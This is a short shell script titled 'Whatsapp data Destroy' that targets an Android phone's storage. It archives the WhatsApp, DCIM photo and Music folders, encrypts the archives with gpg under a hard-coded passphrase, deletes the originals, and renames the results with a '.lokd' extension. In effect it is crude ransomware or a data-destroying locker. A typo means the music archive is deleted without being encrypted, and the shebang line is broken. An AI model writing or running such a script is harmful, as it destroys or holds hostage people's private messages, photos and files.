#!/
#Whatsapp data Destroy
zip -r /sdcard/wpp.zip /sdcard/Whatsapp
zip -r /sdcard/DCIM.zip /sdcard/DCIM
zip -r /sdcard/musix.zip /sdcard/Music
gpg --yes --batch --passphrase=[hack] -c /sdcard/wpp.zip
gpg --yes --batch --passphrase=[hack] -c /sdcard/DCIM.zip
gpg --yes --batch --passphrase=[hack] -c /sdcard/muix.zip
rm -r /sdcard/Whatsapp
rm -r /sdcard/Music
rm -r /sdcard/DCIM
rm -r /sdcard/DCIM.zip
rm -r /sdcard/musix.zip
rm -r /sdcard/wpp.zip
mv /sdcard/wpp.zip.gpg /sdcard/a1.lokd
mv /sdcard/musix.zip.gpg /sdcard/a2.lokd
mv /sdcard/DCIM.zip.gpg /sdcard/a3.lokd
echo "all complete"
